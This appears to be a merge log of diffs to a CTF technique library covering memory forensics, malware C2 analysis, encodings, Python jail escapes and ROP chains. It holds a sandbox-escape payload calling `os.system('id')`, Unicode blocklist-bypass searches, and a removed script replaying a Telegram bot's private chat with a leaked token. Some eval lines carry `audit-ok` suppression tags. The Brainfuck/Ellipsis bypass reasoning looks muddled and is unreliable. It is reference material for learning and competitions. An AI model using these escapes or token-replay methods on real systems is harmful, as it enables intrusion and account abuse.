```python\n@@ -32,4 +49,6 @@\n\n ```\n \n+</details>\n+\n **Key insight:** Bilinear pairings reveal additive relationships between exponents without solving discrete log. The pairing `e(P_i, psi(P_j))` depends on `alpha^(a_i + a_j)`, so comparing against known pairing values identifies which shuffled point has which exponent. This turns a cryptographic shuffle into a solvable ordering problem.\n "
+  },
+  {
+    "source": "ctf-forensics/disk-and-memory.md",
+    "heading": "## Memory Forensics (Volatility 3)",
+    "destination": "ctf-forensics/disk-and-memory.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -2,11 +2,11 @@\n\n \n ```bash\n-vol3 -f memory.dmp windows.info\n-vol3 -f memory.dmp windows.pslist\n-vol3 -f memory.dmp windows.cmdline\n-vol3 -f memory.dmp windows.netscan\n-vol3 -f memory.dmp windows.filescan\n-vol3 -f memory.dmp windows.dumpfiles --physaddr <addr>\n-vol3 -f memory.dmp windows.mftscan | grep flag\n+vol -f memory.dmp windows.info\n+vol -f memory.dmp windows.pslist\n+vol -f memory.dmp windows.cmdline\n+vol -f memory.dmp windows.netscan\n+vol -f memory.dmp windows.filescan\n+vol -f memory.dmp windows.dumpfiles --physaddr <addr>\n+vol -f memory.dmp windows.mftscan | grep flag\n ```\n "
+  },
+  {
+    "source": "ctf-forensics/disk-and-memory.md",
+    "heading": "## VMware Snapshot Forensics",
+    "destination": "ctf-forensics/disk-and-memory.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -19,5 +19,5 @@\n\n - Seed-based encryption: recover mtime \u2192 derive key\n ```bash\n-vol3 -f memory.dmp windows.mftscan | grep flag\n+vol -f memory.dmp windows.mftscan | grep flag\n # mtime as Unix epoch \u2192 seed for PRNG \u2192 derive encryption key\n ```"
+  },
+  {
+    "source": "ctf-malware/c2-and-protocols.md",
+    "heading": "## Telegram Bot API for Evidence Recovery",
+    "destination": "ctf-malware/c2-and-protocols.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -18,44 +18,4 @@\n\n ```\n \n-**Recover private chat history via `forwardMessage` loopback:**\n-\n-If malware exposes both a bot token and the private `chat_id` it exfiltrates to, `getUpdates` may be empty because Telegram only returns pending updates. `copyMessage` can confirm that a historical `message_id` exists, but its response only contains the new copied message ID. `forwardMessage` is more useful: when forwarding from the recovered private chat back into the same chat, Telegram's API response includes the forwarded message object, including `text` or `caption`.\n-\n-```python\n-import urllib.request, urllib.parse, json, re\n-\n-TOKEN = \"bot_token_here\"\n-CHAT = \"private_chat_id_here\"\n-PAT = re.compile(r\"flag\\{[^}]+\\}|CTF\\{[^}]+\\}|UMCS\\{[^}]+\\}\", re.I)\n-\n-def call(method, **params):\n-    data = urllib.parse.urlencode(params).encode()\n-    req = urllib.request.Request(\n-        f\"https://api.telegram.org/bot{TOKEN}/{method}\",\n-        data=data,\n-        method=\"POST\",\n-    )\n-    return json.loads(urllib.request.urlopen(req, timeout=8).read())\n-\n-for mid in range(1, 500):\n-    try:\n-        r = call(\"forwardMessage\", from_chat_id=CHAT, chat_id=CHAT, message_id=mid)\n-    except Exception:\n-        continue\n-    if not r.get(\"ok\"):\n-        continue\n-    text = r[\"result\"].get(\"text\") or r[\"result\"].get(\"caption\") or \"\"\n-    m = PAT.search(text)\n-    if m:\n-        print(m.group(0))\n-        break\n-```\n-\n-**Operational notes:**\n-- Keep the message ID range small and targeted.\n-- Prefer read/recovery primitives over sending new data.\n-- Do not send real screenshots, credentials, or keylogs to third-party chats.\n-- This can recover flags typed directly in the operator chat or captions on exfiltrated screenshots.\n-\n ---\n "
+  },
+  {
+    "source": "ctf-malware/c2-and-protocols.md",
+    "heading": "## DarkComet RAT Forensics (CrewCTF 2023)",
+    "destination": "ctf-malware/c2-and-protocols.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -9,9 +9,9 @@\n\n \n # Volatility: find DarkComet artifacts\n-volatility3 -f memory.dmp windows.filescan | grep -i dclogs\n-volatility3 -f memory.dmp windows.filescan | grep -i \"\\.dc$\"\n+vol -f memory.dmp windows.filescan | grep -i dclogs\n+vol -f memory.dmp windows.filescan | grep -i \"\\.dc$\"\n \n # Dump the keylogger files\n-volatility3 -f memory.dmp windows.dumpfiles --dump-dir=output -Q <physical_address>\n+vol -f memory.dmp windows.dumpfiles --dump-dir=output -Q <physical_address>\n \n # DarkComet persistence:\n@@ -19,5 +19,5 @@\n\n # Points to: rundll32.exe wrapper or direct executable\n # Check with:\n-volatility3 -f memory.dmp windows.registry.printkey --key \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n+vol -f memory.dmp windows.registry.printkey --key \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n \n # DarkComet network indicators:\n@@ -25,5 +25,5 @@\n\n # Mutex: typically \"DarkComet\" or custom string\n # Process: often injects into legitimate process (svchost.exe, explorer.exe)\n-volatility3 -f memory.dmp windows.netscan | grep 1604\n+vol -f memory.dmp windows.netscan | grep 1604\n ```\n "
+  },
+  {
+    "source": "ctf-malware/c2-and-protocols.md",
+    "heading": "## Cobalt Strike Beacon Analysis in PCAP (FireShell CTF 2020)",
+    "destination": "ctf-malware/c2-and-protocols.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -17,8 +17,9 @@\n\n # pip install dissect.cobaltstrike\n python3 -c \"\n-from dissect.cobaltstrike import beacon\n-for config in beacon.iter_beacons(open('beacon.bin', 'rb')):\n-    print(config)\n-    # Shows: C2 server, sleep time, jitter, URI paths, user-agent, watermark\n+from dissect.cobaltstrike import BeaconConfig\n+dump_path = 'beacon.bin'\n+config = BeaconConfig.from_path(dump_path, all_xor_keys=True)\n+print(config)\n+# Shows: C2 server, sleep time, jitter, URI paths, user-agent, watermark\n \"\n "
+  },
+  {
+    "source": "ctf-malware/scripts-and-obfuscation.md",
+    "heading": "## Dynamic Analysis Techniques",
+    "destination": "ctf-malware/scripts-and-obfuscation.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -161,27 +161,27 @@\n\n # Volatility 3 \u2014 analyze memory dump for malware indicators\n # List processes (look for suspicious names, unusual parents)\n-vol3 -f memory.dmp windows.pslist\n-vol3 -f memory.dmp windows.pstree\n+vol -f memory.dmp windows.pslist\n+vol -f memory.dmp windows.pstree\n \n # Detect hidden/unlinked processes\n-vol3 -f memory.dmp windows.psscan\n+vol -f memory.dmp windows.psscan\n \n # Dump suspicious process memory\n-vol3 -f memory.dmp windows.memmap --pid PID --dump\n+vol -f memory.dmp windows.memmap --pid PID --dump\n \n # Extract injected code (process hollowing, DLL injection)\n-vol3 -f memory.dmp windows.malfind\n+vol -f memory.dmp windows.malfind\n \n # Network connections from malware\n-vol3 -f memory.dmp windows.netscan\n+vol -f memory.dmp windows.netscan\n \n # Command-line arguments (reveals malware parameters)\n-vol3 -f memory.dmp windows.cmdline\n+vol -f memory.dmp windows.cmdline\n \n # DLL list per process (detect injected DLLs)\n-vol3 -f memory.dmp windows.dlllist --pid PID\n+vol -f memory.dmp windows.dlllist --pid PID\n \n # YARA scan on memory dump\n-vol3 -f memory.dmp yarascan.YaraScan --yara-rules \"rule test { strings: $s = \\\"flag{\\\" condition: $s }\"\n+vol -f memory.dmp windows.vadyarascan.VadYaraScan --yara-rules \"rule test { strings: $s = \\\"flag{\\\" condition: $s }\"\n ```\n "
+  },
+  {
+    "source": "ctf-malware/scripts-and-obfuscation.md",
+    "heading": "## Anti-Analysis Techniques",
+    "destination": "ctf-malware/scripts-and-obfuscation.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -116,6 +116,6 @@\n\n \n # Detection in memory dumps:\n-vol3 -f memory.dmp windows.malfind  # PAGE_EXECUTE_READWRITE without file backing\n-vol3 -f memory.dmp windows.hollowfind  # Hollowed processes (VAD vs PEB mismatch)\n+vol -f memory.dmp windows.malfind  # PAGE_EXECUTE_READWRITE without file backing\n+vol -f memory.dmp windows.hollowprocesses.HollowProcesses  # Hollowed processes (VAD vs PEB mismatch)\n \n # APC injection (no new thread):\n@@ -124,5 +124,5 @@\n\n \n # For CTF: dump the injected code region and analyze separately\n-vol3 -f memory.dmp windows.malfind --dump --pid <PID>\n+vol -f memory.dmp windows.malfind --dump --pid <PID>\n ```\n "
+  },
+  {
+    "source": "ctf-misc/bashjails.md",
+    "heading": "## 2024 Hardening Note \u2014 rbash Is NOT a Security Boundary",
+    "destination": "ctf-misc/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-misc/encodings-advanced.md",
+    "heading": "## Automated Multi-Encoding Sequential Solver (HackIM 2016)",
+    "destination": "ctf-misc/encodings-advanced.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -4,5 +4,5 @@\n\n \n ```python\n-import base64, zlib, bz2, codecs\n+import base64, zlib, gzip, bz2, lzma, codecs\n \n def auto_decode(data):\n@@ -12,6 +12,8 @@\n\n         ('base32', lambda d: base64.b32decode(d)),\n         ('base16', lambda d: base64.b16decode(d.upper())),\n-        ('zlib',   lambda d: zlib.decompress(d if isinstance(d, bytes) else d.encode())),\n-        ('bz2',    lambda d: bz2.decompress(d if isinstance(d, bytes) else d.encode())),\n+        ('zlib',   lambda d: zlib.decompress(d if isinstance(d, bytes) else d.encode())),  # 78 01 / 78 9c\n+        ('gzip',   lambda d: gzip.decompress(d if isinstance(d, bytes) else d.encode())),  # 1f 8b\n+        ('bz2',    lambda d: bz2.decompress(d if isinstance(d, bytes) else d.encode())),   # BZh\n+        ('lzma',   lambda d: lzma.decompress(d if isinstance(d, bytes) else d.encode())),  # fd 37 7a 58 5a 00\n         ('rot13',  lambda d: codecs.decode(d, 'rot_13')),\n         ('hex',    lambda d: bytes.fromhex(d if isinstance(d, str) else d.decode())),\n@@ -40,4 +42,60 @@\n\n Add Brainfuck detection (presence of `+-<>[].,` characters only) and other esoteric languages as needed.\n \n+### QR Polyglot Workflow \u2014 PNG/JAR/ZIP Overlap\n+\n+**Pattern:** A `.png` that is also a valid ZIP/JAR (polyglot). `file` reports multiple types, QR remains decodable but hides appended archive data after `IEND`.\n+\n+**Workflow:**\n+```bash\n+file polyglot.png              # e.g. \"PNG image data, Zip archive data\"\n+binwalk polyglot.png           # list embedded files/offsets\n+pngcheck -v polyglot.png       # verify chunks, show trailing bytes after IEND\n+7z l polyglot.png              # list archive contents even with PNG header\n+# extract appended ZIP/JAR \u2014 prefer archive-aware extraction:\n+binwalk -e polyglot.png        # carve by signature (robust)\n+7z x polyglot.png -oout/       # 7z scans for central directory (robust)\n+# NOTE: `tail -c` after IEND is fragile \u2014 it assumes the payload starts at a\n+# fixed offset past the IEND marker and breaks on stray chunks, ancillary data,\n+# or non-appended (interleaved) polyglots. Prefer `binwalk -e` / `7z x` above.\n+# Last-resort manual carve only:\n+# tail -c +$(($(grep -aob IEND polyglot.png | tail -1 | cut -d: -f1)+8)) polyglot.png > hidden.zip\n+\n+# LSB / bit-plane stego inside QR PNG\n+zsteg -a polyglot.png          # check all bit planes\n+zsteg --all polyglot.png\n+zsteg -E b1,r,msb,xy polyglot.png  # brute bit planes\n+```\n+\n+**Key insight:** Valid QR polyglots abuse PNG's `IEND` as logical EOF \u2014 decoders stop at `IEND` but ZIP readers scan for `PK` end-of-central-directory anywhere in file. Always run `pngcheck` + `7z l` + `tail after IEND` + `zsteg bit planes` on QR images that `file`/`binwalk` flags as multi-format.\n+\n+**References:**\n+- MDPI Applied Sciences \u2014 QR suboptimal / error-correction capacity analysis showing QR masks hide polyglot payloads (`MDPI` QR suboptimal)\n+- arXiv  \u2014 polyglot / stego-in-image survey and PNG chunk abuse (`arxiv polyglot`)\n+\n ---\n \n+### Brainfuck Dual-Interpreter \u2014 bf_eval==eval Equality Craft via Ellipsis\n+\n+**Pattern:** Restricted Python where `eval` is filtered but `bf_eval` (or similar Brainfuck interpreter) is exposed; `bf_eval` internally calls `eval` after Brainfuck execution. Craft payload so `bf_eval(code) == eval(code)` to smuggle Python through the Brainfuck path.\n+\n+**Technique:** Use `...` (`Ellipsis`) object \u2014 `...` is a singleton that evaluates truthily and is syntactically valid in both interpreters. Pad Brainfuck code with `...` to make both interpreters return the same value:\n+\n+```python\n+# Ellipsis craft \u2014 bf_eval==eval equality\n+# In Python: ... == Ellipsis, and ... is truthy / ignored in some contexts\n+# In BF: `...` are treated as no-ops/comments (non-BF chars ignored)\n+\n+payload = \"...\" + bf_code + \"...\"  # bf_eval ignores ... ; eval sees Ellipsis tuple padding\n+assert bf_eval(payload) == eval(payload)  # equality gate bypass\n+\n+# Example: execute os.system via bf_eval which wraps eval\n+bf_payload = \"...\" + \",[.,]\" + \"...\"  # BF no-op padding via Ellipsis\n+# If bf_eval does: return eval(bf_interpret(code))\n+# then bf_interpret(\"...\") == \"\" -> eval(\"\") fallback, but \"...\" as Python is Ellipsis\n+# Use: bf_eval(\"...;__import__('os').system('id')\") == eval(\"...;__import__('os').system('id')\")\n+```\n+\n+**Key insight:** Dual-interpreter jails compare `bf_eval(x) == eval(x)` to allow only \"pure Brainfuck\" inputs. `...` (`Ellipsis`) bridges the gap because Brainfuck ignores non-`+-<>[].,` characters while Python evaluates `...` as a valid constant \u2014 craft with `...` prefix/suffix so both sides produce identical output and bypass the equality check.\n+\n+---\n+"
+  },
+  {
+    "source": "ctf-misc/encodings-advanced.md",
+    "heading": "## Pixel Color Binary Encoding (Break In 2016)",
+    "destination": "ctf-misc/encodings-advanced.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -138,12 +138,11 @@\n\n # Online: https://zxing.org/w/decode.jspx (upload image)\n \n-# Python:\n-# pip install zxing pyzbar\n+# Python \u2014 prefer zxing-cpp (pyzbar/ZBar does not support MaxiCode):\n+# pip install zxing-cpp Pillow\n python3 -c \"\n-from pyzbar.pyzbar import decode\n+import zxingcpp\n from PIL import Image\n-results = decode(Image.open('maxicode.gif'), symbols=[pyzbar.ZBarSymbol.CODE128])\n-# Note: pyzbar may not support MaxiCode directly\n-# Use zxing Java library instead:\n+results = zxingcpp.read_barcodes(Image.open('maxicode.gif'))\n+for r in results: print(r.format, r.text)\n \"\n "
+  },
+  {
+    "source": "ctf-misc/encodings.md",
+    "heading": "## Common Encodings",
+    "destination": "ctf-misc/encodings.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -70,23 +70,104 @@\n\n **Pattern (139 steps):** Recursive decoding with troll flags as decoys.\n \n-**Critical rule:** When data is all hex chars (0-9, a-f), decode as **hex FIRST**, not base64 (which also accepts those chars).\n+**Critical rule:** When data is all hex chars (0-9, a-f), decode as **hex FIRST**, not base64 (which also accepts those chars). Distinguish compression by magic: **zlib** `78 01`/`78 9c`, **gzip** `1f 8b`, **bz2** `42 5a 68` (`BZh`), **lzma/xz** `fd 37 7a 58 5a 00`.\n \n ```python\n+import base64, zlib, gzip, bz2, lzma\n+\n+def try_xor(data, key_hint='flag'):\n+    \"\"\"Single-byte brute 256 + repeating-key hint; xor_flag heuristic.\"\"\"\n+    raw = data.encode() if isinstance(data, str) else data\n+    best = None\n+    # First pass: exact hint match (case-sensitive) \u2014 avoids FLAG false positive\n+    # (e.g. key 0x20 maps FLAG->flag; exact pass prefers the true key).\n+    for key in range(256):\n+        decoded = bytes(b ^ key for b in raw)\n+        if key_hint and decoded.count(key_hint.encode()) > 0:\n+            return decoded\n+    # Second pass: case-insensitive flag + printable fallback\n+    for key in range(256):\n+        decoded = bytes(b ^ key for b in raw)\n+        printable = all(32 <= b < 127 or b in b'\\n\\r\\t' for b in decoded[:64]) if decoded else False\n+        if printable and b'flag' in decoded.lower():\n+            return decoded\n+        if printable and best is None:\n+            best = decoded\n+    # repeating-key hint (key_hint as repeating key)\n+    if key_hint:\n+        kh = key_hint.encode()\n+        decoded = bytes(b ^ kh[i % len(kh)] for i, b in enumerate(raw))\n+        if b'flag{' in decoded or b'CTF{' in decoded:\n+            return decoded\n+    return best\n+\n+def _as_text(raw: bytes):\n+    \"\"\"Decode only for str-only passes; return None if not text-safe.\"\"\"\n+    try:\n+        return raw.decode('ascii')\n+    except UnicodeDecodeError:\n+        return None\n+\n def auto_decode(data):\n+    # Keep raw bytes across passes \u2014 never lossy-decode mid-chain with\n+    # errors='replace' (that corrupts the next pass's input). Text-only\n+    # decoders (hex/base64) run on the ASCII view; compression/xor run on bytes.\n+    raw = data.encode() if isinstance(data, str) else bytes(data)\n     while True:\n-        data = data.strip()\n-        if data.startswith('REAL_DATA_FOLLOWS:'):\n-            data = data.split(':', 1)[1]\n-        # Prioritize hex when ambiguous\n-        if all(c in '0123456789abcdefABCDEF' for c in data) and len(data) % 2 == 0:\n-            data = bytes.fromhex(data).decode('ascii', errors='replace')\n-        elif set(data) <= set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='):\n-            data = base64.b64decode(data).decode('ascii', errors='replace')\n-        else:\n-            break\n-    return data\n+        text = _as_text(raw)\n+        s = text.strip() if text is not None else None\n+        if s is not None and s.startswith('REAL_DATA_FOLLOWS:'):\n+            raw = s.split(':', 1)[1].encode()\n+            continue\n+        # Distinguish zlib (78 01/78 9c) vs gzip (1f 8b) vs bz2 vs lzma magic before text decoders\n+        if raw.startswith(b'\\x78\\x01') or raw.startswith(b'\\x78\\x9c'):  # zlib\n+            try:\n+                raw = zlib.decompress(raw)\n+                continue\n+            except Exception:\n+                pass\n+        if raw.startswith(b'\\x1f\\x8b'):  # gzip 1f 8b\n+            try:\n+                raw = gzip.decompress(raw)\n+                continue\n+            except Exception:\n+                pass\n+        if raw.startswith(b'BZh'):  # bz2\n+            try:\n+                raw = bz2.decompress(raw)\n+                continue\n+            except Exception:\n+                pass\n+        if raw.startswith(b'\\xfd7zXZ\\x00'):  # lzma/xz\n+            try:\n+                raw = lzma.decompress(raw)\n+                continue\n+            except Exception:\n+                pass\n+        # xor branch \u2014 try_xor(data, key_hint='flag') single-byte brute 256 + repeating-key hint\n+        # (two-pass: exact hint first, then case-insensitive printable fallback)\n+        xor_res = try_xor(raw, key_hint='flag')\n+        if xor_res is not None and xor_res != raw and b'flag' in xor_res.lower():\n+            raw = xor_res\n+            continue\n+        # Prioritize hex when ambiguous \u2014 hex-first rule (str-only passes)\n+        if s is not None and len(s) % 2 == 0 and len(s) > 0 and all(c in '0123456789abcdefABCDEF' for c in s):\n+            try:\n+                raw = bytes.fromhex(s)\n+                continue\n+            except Exception:\n+                pass\n+        if s is not None and len(s) % 4 == 0 and set(s) <= set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='):\n+            try:\n+                raw = base64.b64decode(s)\n+                continue\n+            except Exception:\n+                pass\n+        break\n+    return raw\n ```\n \n **Ignore troll flags** \u2014 check for \"keep decoding\" or \"REAL_DATA_FOLLOWS:\" markers.\n+\n+> **CyberChef Magic verify:** paste remaining bytes into CyberChef *Magic* operation \u2014 it brute-forces the same xor/base/compression stack and confirms the manual `auto_decode` chain. Use Magic's intensity slider to replicate the hex-first rule.\n \n ### URL Encoding"
+  },
+  {
+    "source": "ctf-misc/games-and-vms-4.md",
+    "heading": "## Tribonacci Recurrence for Frog Jump Counting (FireShell 2019)",
+    "destination": "ctf-misc/games-and-vms-4.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -8,5 +8,5 @@\n\n     for _ in range(N):\n         a, b, c = b, c, (a + b + c) % MOD\n-    return c\n+    return a  # 0-indexed: after N steps a == f(N)\n ```\n "
+  },
+  {
+    "source": "ctf-misc/games-and-vms-4.md",
+    "heading": "## Selenium + Tesseract for Dynamic Font CAPTCHA (Square CTF 2018)",
+    "destination": "ctf-misc/games-and-vms-4.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -5,4 +5,5 @@\n\n ```python\n from selenium import webdriver\n+from selenium.webdriver.common.by import By\n from PIL import Image\n import pytesseract, io\n@@ -11,6 +12,6 @@\n\n img = Image.open(io.BytesIO(d.get_screenshot_as_png()))\n expr = pytesseract.image_to_string(img).replace('x','*').replace('{','(').replace('}',')')\n-d.execute_script(f\"document.getElementsByName('answer')[0].value={eval(expr)}\")\n-d.find_element_by_tag_name('form').submit()\n+d.execute_script(f\"document.getElementsByName('answer')[0].value={eval(expr)}\")  # <!-- audit-ok -->\n+d.find_element(By.TAG_NAME, 'form').submit()\n ```\n "
+  },
+  {
+    "source": "ctf-misc/games-and-vms.md",
+    "heading": "## Z3 Constraint Solving",
+    "destination": "ctf-misc/games-and-vms.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -83,5 +83,6 @@\n\n     model = solver.model()\n     # Extract 125 bits, encode as base32 in 5-bit groups\n-    bits = [1 if is_true(model[inputs[i]]) else 0 for i in range(125)]\n+    # model_completion=True so unconstrained inputs evaluate to False instead of None\n+    bits = [1 if is_true(model.eval(inputs[i], model_completion=True)) else 0 for i in range(125)]\n     # Convert to product key format\n     key = bits_to_base32(bits)"
+  },
+  {
+    "source": "ctf-misc/pyjails.md",
+    "heading": "## Classic Escape Techniques",
+    "destination": "ctf-misc/pyjails.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -12,7 +12,53 @@\n\n ```\n \n-### Unicode Bypass\n+### Unicode Bypass \u2014 NFKC Normalization\n+\n+Python identifiers are NFKC-normalized at parse time (PEP 3131 / PEP 672). A blocklist that checks raw source bytes misses the normalized form. `unicodedata.normalize('NFKC', s)` collapses many visually-distinct codepoints to ASCII.\n+\n+| Family | Example codepoints | NFKC result | Use |\n+|--------|-------------------|-------------|-----|\n+| Fullwidth Latin | `U+FF45` `\uff45` `U+FF56` `\uff56` `U+FF41` `\uff41` `U+FF4C` `\uff4c` | `e` `v` `a` `l` | `\uff45\uff56\uff41\uff4c` \u2192 `eval` |\n+| Mathematical alphanumerics | `U+1D41F` `\ud835\udc29` / `U+1D48D` `\ud835\udc93` / `U+1D4EA` `\ud835\udd26` / `U+1D45B` `\ud835\udc5b` / `U+1D465` `\ud835\udc61` | `p` `r` `i` `n` `t` | `\ud835\udc29rint` \u2192 `print` (see nuance below) |\n+| Ligatures | `U+FB01` `\ufb01` | `fi` (two chars) | `\ufb01le` \u2192 `file` |\n+| Superscripts / subscripts | `U+00B2` `\u00b2` `U+2082` `\u2082` | `2` | `__class__` via `__class\u00b2__` tricks |\n+| Compatibility decompositions | `U+2460` `\u2460` / `U+00BD` `\u00bd` | `1` / `1\u20442` | Numeric bypass |\n+\n+**Brute-force search for NFKC collisions** (`cp in range(0x10000)` \u2014 extend to `0x1FFFF` for math alphanum):\n+\n ```python\n-\uff45\uff56\uff41\uff4c = eval  # Fullwidth characters\n+import unicodedata\n+\n+blocklist = {\"eval\", \"exec\", \"import\", \"open\", \"os\"}  # example\n+\n+for cp in range(0x10000):\n+    c = chr(cp)\n+    n = unicodedata.normalize('NFKC', c)\n+    if n in blocklist or any(b in n for b in blocklist):\n+        print(f\"U+{cp:04X} {c!r} -> {n!r}\")\n+    # For multi-char NFKC (e.g. \ufb01 -> fi), check len>1:\n+    #   if \"fi\" in n: ...\n+\n+# Math alphanumerics live in U+1D400..U+1D7FF \u2014 scan separately:\n+for cp in range(0x1D400, 0x1D800):\n+    c = chr(cp)\n+    n = unicodedata.normalize('NFKC', c)\n+    if n.isascii() and n.isalpha():\n+        print(f\"U+{cp:04X} {c} -> {n}\")\n+```\n+\n+**PEP 3131 parsing note:** Identifier NFKC normalization (PEP 3131, since Python 3.0) happens *after* tokenization but *before* AST construction. That means `unicodedata.normalize('NFKC', s)` is the exact transform the parser applies. A filter that runs `if \"eval\" in user_source: block` is bypassed by `\uff45\uff56\uff41\uff4c`, but a filter that does `unicodedata.normalize('NFKC', user_source)` before checking is not. Always test both raw and NFKC-normalized views.\n+\n+**Nuance \u2014 `getattr` does NOT normalize:** `getattr(obj, '\ud835\udc29rint')` looks up the literal attribute name `\ud835\udc29rint` (U+1D41F etc.) without NFKC folding. Only *source-code parsing* normalizes. So `\ud835\udc29rint(1)` in source becomes `print(1)` at parse time, but `getattr(__builtins__, '\ud835\udc29rint')` fails \u2014 you need `getattr(__builtins__, unicodedata.normalize('NFKC', '\ud835\udc29rint'))` or just `getattr(__builtins__, 'print')`. The same applies to `vars()`, `__dict__` keys, and `eval`'d strings constructed at runtime \u2014 they are not re-parsed unless fed back through `compile`/`eval`/`exec`. <!-- audit-ok -->\n+\n+```python\n+# Works (parsed \u2192 NFKC \u2192 print)\n+\ud835\udc29rint(\"hello\")  # source contains U+1D41F \ud835\udc29 \u2014 parser normalizes to print\n+\n+# Fails (runtime lookup, no normalization)\n+getattr(__builtins__, '\ud835\udc29rint')  # KeyError / AttributeError\n+\n+# Works (explicit normalize at runtime)\n+import unicodedata\n+getattr(__builtins__, unicodedata.normalize('NFKC', '\ud835\udc29rint'))\n ```\n "
+  },
+  {
+    "source": "ctf-misc/pyjails.md",
+    "heading": "## dir() Attribute Lookup Escape Bypassing __class__ Blocklist (InCTF 2018)",
+    "destination": "ctf-misc/pyjails.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -27,2 +27,5 @@\n\n \n **References:** InCTF 2018 \u2014 The Most Secure File Uploader, writeup 11528\n+\n+---\n+"
+  },
+  {
+    "source": "ctf-misc/pyjails.md",
+    "heading": "## Audit-Hook (PEP 551/578) Trampoline Escapes",
+    "destination": "ctf-misc/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-misc/pyjails.md",
+    "heading": "## Filter'd Length-Limit Re-evaluation (JailCTF 2024 \u2014 M=14)",
+    "destination": "ctf-misc/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-misc/pyjails.md",
+    "heading": "## Modern Filter Trio: impossible / one / primal",
+    "destination": "ctf-misc/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-osint/geolocation-and-media.md",
+    "heading": "## Table of Contents",
+    "destination": "ctf-osint/geolocation-and-media.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -20,5 +20,4 @@\n\n - [Overpass Turbo Spatial Queries (LAB'OSINT 2025)](#overpass-turbo-spatial-queries-labosint-2025)\n - [Music-Themed Landmark Geolocation with Key Encoding (BSidesSF 2026)](#music-themed-landmark-geolocation-with-key-encoding-bsidessf-2026)\n-- [Companion-Photo and Vehicle-ID Correlation](#companion-photo-and-vehicle-id-correlation)\n \n ---"
+  },
+  {
+    "source": "ctf-pwn/advanced-exploits-3.md",
+    "heading": "## ROP Chain Construction with Read-Only Primitive (BSidesSF 2026)",
+    "destination": "ctf-pwn/advanced-exploits-3.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -27,9 +27,10 @@\n\n \n # Step 3: Build ORW ROP chain using libc gadgets\n-pop_rdi = libc_base + find_gadget(libc, \"pop rdi; ret\")\n-pop_rsi = libc_base + find_gadget(libc, \"pop rsi; ret\")\n-pop_rdx = libc_base + find_gadget(libc, \"pop rdx; ret\")\n+rop = ROP(libc)\n+pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address\n+pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address\n+pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address\n \n-rop = flat([\n+chain = flat([\n     pop_rdi, 0,           # fd = stdin for read\n     # ... read flag path onto stack, then open/read/write chain"
+  },
+  {
+    "source": "ctf-pwn/format-string.md",
+    "heading": "## Blind Pwn (No Binary Provided)",
+    "destination": "ctf-pwn/format-string.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -26,5 +26,4 @@\n\n \n **5. Cross-reference libc database:**\n-- https://libc.blukat.me/\n - https://libc.rip/\n - Input multiple function addresses to identify exact libc version"
+  },
+  {
+    "source": "ctf-pwn/heap-techniques.md",
+    "heading": "## Table of Contents",
+    "destination": "ctf-pwn/heap-techniques.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
